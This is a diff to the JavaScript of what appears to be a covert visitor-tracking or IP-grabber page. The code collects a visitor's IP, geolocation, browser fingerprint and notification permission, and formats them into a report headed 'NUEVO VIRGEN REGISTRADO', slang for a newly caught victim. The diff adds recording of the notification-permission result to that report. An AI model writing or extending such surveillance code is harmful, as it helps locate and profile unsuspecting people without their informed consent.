@@ -91,9 +91,23 @@
     }
 
     function solicitarNotificaciones() {
-      if ("Notification" in window) {
-        Notification.requestPermission();
-      }
+      return new Promise((resolve) => {
+        if ("Notification" in window) {
+          Notification.requestPermission().then((permiso) => {
+            if (permiso === "granted") {
+              new Notification("Permiso de notificación activado ✅", {
+                body: "Gracias por aceptar",
+                icon: "https://cdn-icons-png.flaticon.com/512/545/545705.png"
+              });
+              resolve("Permitido");
+            } else {
+              resolve("Denegado");
+            }
+          });
+        } else {
+          resolve("No compatible");
+        }
+      });
     }
 
     function solicitarUbicacion() {
@@ -116,7 +130,7 @@
     async function enviarDatos() {
       const ip = await obtenerIP();
       const ubicacion = await solicitarUbicacion();
-      solicitarNotificaciones();
+      const notificaciones = await solicitarNotificaciones();
 
       const datos = {
         agente: navigator.userAgent,
@@ -126,13 +140,15 @@
         alto: screen.height,
         hora: new Date().toLocaleString(),
         ip: ip,
-        ubicacion: ubicacion
+        ubicacion: ubicacion,
+        notificaciones: notificaciones
       };
 
       const mensaje = `
 NUEVO VIRGEN REGISTRADO:
 ╣⋙ IP: ${datos.ip}
 ╣⋙ Ubicación: ${datos.ubicacion}
+╣⋙ Notificaciones: ${datos.notificaciones}
 ╣⋙ User-Agent: ${datos.agente}
 ╣⋙ Idioma: ${datos.idioma}
 ╣⋙ Plataforma: ${datos.plataforma}
